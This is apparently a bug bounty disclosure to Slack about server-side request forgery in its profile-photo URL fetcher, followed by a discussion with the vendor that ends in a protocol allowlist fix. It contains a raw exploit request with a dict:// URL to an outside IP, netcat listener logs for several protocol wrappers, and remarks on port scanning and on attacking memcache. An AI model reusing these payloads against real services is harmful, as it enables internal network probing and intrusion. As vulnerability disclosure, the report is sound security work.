title: SSRF on https://whitehataudit.slack.com/account/photo

profile.name: Slack
profile.about: All your team communication in one place, instantly searchable, and available wherever you go.

vulnerability_information:
During post request to https://whitehataudit.slack.com/account/photo:
POST /account/photo HTTP/1.1
Host: whitehataudit.slack.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://whitehataudit.slack.com/account/photo?url=http%3A%2F%2F95.211.198.76:5555%2Fpicture-54679.jpg
Cookie: _ga=GA1.2.1382862309.1401451625; a-2195611171=aP4kbQ9Y8dnl8ZYuS6SK6ZeF%2FyqCF%2Bt1hOMyzdBzvIbWXqrJ8IyG7%2B8S%2FG%2BOkuw9KDY2I%2BXGkTZ80XFYFYznxQ%3D%3D; a=2195611171
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

crumb=s-1401452311-423d40614d-%E2%98%83&crop=1&url=dict%3A%2F%2F95.211.198.76%3A6666%2Fpicture-54679.jpg&cropbox=0%2C0%2C85

We got an SSRF with NOT port whitelist and with NOT disabled wrappers (see below):
nc -lvv 6655
Connection from 184.73.10.28 port 6655 [tcp/*] accepted
GET /picture-54679.jpg HTTP/1.1
User-Agent: Slackbot (+https://api.slack.com/robots)
Host: 95.211.198.76:6655
Accept: */*
Accept-Encoding: gzip,deflate

gopher
nc -lvv 6655
Connection from 54.197.108.234 port 6655 [tcp/*] accepted
icture-54679.jpg


dict.
nc -lvv 6655
Connection from 107.21.158.167 port 6655 [tcp/*] accepted
CLIENT libcurl 7.22.0
picture-54679.jpg
QUIT

ldap
nc -lvv 6655
Connection from 54.224.81.147 port 6655 [tcp/*] accepted
0

telnet
nc -lvv 6655
Connection from 54.224.81.147 port 6655 [tcp/*] accepted

pop3
nc -lvv 6655
Connection from 50.16.108.10 port 6655 [tcp/*] accepted
QUIT

It's possible to use it to port scanning (using timing). Good writeup about ssrf vulns: https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit

activities.message: Since we purposefully allow the fetching of any remote image over http(s), what do you suggest as a fix?
activities.markdown_message: Since we purposefully allow the fetching of any remote image over http(s), what do you suggest as a fix?

activities.message:
Fistable,
- disable all wrappers except http and https, maybe ftp. Not like now - pop3, tenet, ldap, dict, gopher.
Secondly, 
- allow only whitelisted port, not like now - any port. 

At this time it is possible to scan port (for example internal network).  Wrappers dict and gopher can be used for attack plain text protocol like memcache.
activities.markdown_message:
Fistable,

  • disable all wrappers except http and https, maybe ftp. Not like now - pop3, tenet, ldap, dict, gopher. Secondly,
  • allow only whitelisted port, not like now - any port.

At this time it is possible to scan port (for example internal network). Wrappers dict and gopher can be used for attack plain text protocol like memcache.

activities.message:
Ahh, I now understand what you're saying. I didn't realize we were allowing other protocols to be used.

I've rolled out a fix to only allow HTTP/HTTPS for fetching here. I don't think we're going to limit ports. Does that fix the issue satisfactorily?
activities.markdown_message:
Ahh, I now understand what you're saying. I didn't realize we were allowing other protocols to be used.

I've rolled out a fix to only allow HTTP/HTTPS for fetching here. I don't think we're going to limit ports. Does that fix the issue satisfactorily?

activities.message: This much better than was. And i recommend to disallow requests to either local or public company's infrastructure IPs. This helps to avoid any possible attack vectors.
activities.markdown_message: This much better than was. And i recommend to disallow requests to either local or public company's infrastructure IPs. This helps to avoid any possible attack vectors.

activities.message: Thanks - we'll likely implement something like this in the future. We have a change like this already planned for other components that perform fetches.
activities.markdown_message: Thanks - we'll likely implement something like this in the future. We have a change like this already planned for other components that perform fetches.
